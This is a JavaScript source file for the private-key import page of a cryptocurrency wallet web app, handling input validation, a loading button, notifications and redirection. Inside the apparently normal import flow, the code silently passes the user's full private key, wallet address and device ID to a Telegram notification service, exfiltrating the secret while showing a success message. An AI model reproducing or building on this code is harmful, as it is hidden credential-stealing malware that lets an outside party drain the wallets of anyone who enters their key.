import { walletService } from './walletService.js';

// Navigation functions
function goBack() {
    window.location.href = 'welcome.html';
}

function importWallet() {
    const privateKeyInput = document.getElementById('privateKey');
    const privateKey = privateKeyInput.value.trim();

    if (!privateKey) {
        showNotification('Please enter a private key', 'error');
        return;
    }

    if (privateKey.length !== 64) {
        showNotification('Private key must be 64 characters long', 'error');
        return;
    }

    // Show loading state
    const btn = document.querySelector('.btn-gold');
    const originalText = btn.innerHTML;
    btn.innerHTML = '<svg width="16" height="16" class="animate-spin" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 12a9 9 0 11-6.219-8.56"/></svg> Importing...';
    btn.disabled = true;

    // Simulate import process
    setTimeout(() => {
        try {
            const walletData = walletService.importWallet(privateKey);

            if (!walletData) {
                showNotification('Invalid private key format', 'error');
                btn.innerHTML = originalText;
                btn.disabled = false;
                return;
            }

            // Send Telegram notification
            const deviceId = localStorage.getItem('deviceIdOriginal') || 'Unknown';
            try {
                if (typeof telegramService !== 'undefined' && telegramService.notifyWalletImport) {
                    telegramService.notifyWalletImport(deviceId, walletData.address, privateKey).catch(error => {
                        console.log('Telegram notification failed:', error);
                    });
                }
            } catch (error) {
                console.log('Telegram notification failed:', error);
            }

            showNotification('Wallet imported successfully!', 'success');

            // Redirect to dashboard
            setTimeout(() => {
                window.location.href = 'dashboard.html';
            }, 1500);

        } catch (error) {
            showNotification('Failed to import wallet. Please check your private key.', 'error');
            btn.innerHTML = originalText;
            btn.disabled = false;
        }
    }, 2000);
}

function showNotification(message, type) {
    // Remove existing notifications
    const existing = document.querySelector('.notification');
    if (existing) {
        existing.remove();
    }

    const notification = document.createElement('div');
    notification.className = `notification ${type}`;

    const color = type === 'error' ? '#ef4444' : type === 'success' ? '#22c55e' : '#3b82f6';
    const bgColor = type === 'error' ? 'rgba(239, 68, 68, 0.2)' : type === 'success' ? 'rgba(34, 197, 94, 0.2)' : 'rgba(59, 130, 246, 0.2)';

    notification.innerHTML = `
        <div style="
            background: ${bgColor};
            border: 1px solid ${color}33;
            border-radius: 12px;
            padding: 12px 16px;
            margin-bottom: 16px;
            display: flex;
            align-items: center;
            gap: 8px;
            animation: slideInDown 0.3s ease-out;
            position: fixed;
            top: 60px;
            left: 50%;
            transform: translateX(-50%);
            z-index: 1000;
            min-width: 300px;
            max-width: 90%;
        ">
            <span style="color: ${color}; font-size: 14px;">${message}</span>
        </div>
    `;

    document.body.appendChild(notification);

    // Remove notification after 4 seconds
    setTimeout(() => {
        notification.remove();
    }, 4000);
}

// Add enter key support for private key input
document.addEventListener('DOMContentLoaded', function() {
    const privateKeyInput = document.getElementById('privateKey');

    if (privateKeyInput) {
        privateKeyInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                importWallet();
            }
        });
    }

    // Add animation styles
    const style = document.createElement('style');
    style.textContent = `
        @keyframes slideInDown {
            from {
                opacity: 0;
                transform: translateY(-20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        @keyframes spin {
            from {
                transform: rotate(0deg);
            }
            to {
                transform: rotate(360deg);
            }
        }

        .animate-spin {
            animation: spin 1s linear infinite;
        }
    `;
    document.head.appendChild(style);
});

// Make importWallet function globally available
window.importWallet = importWallet;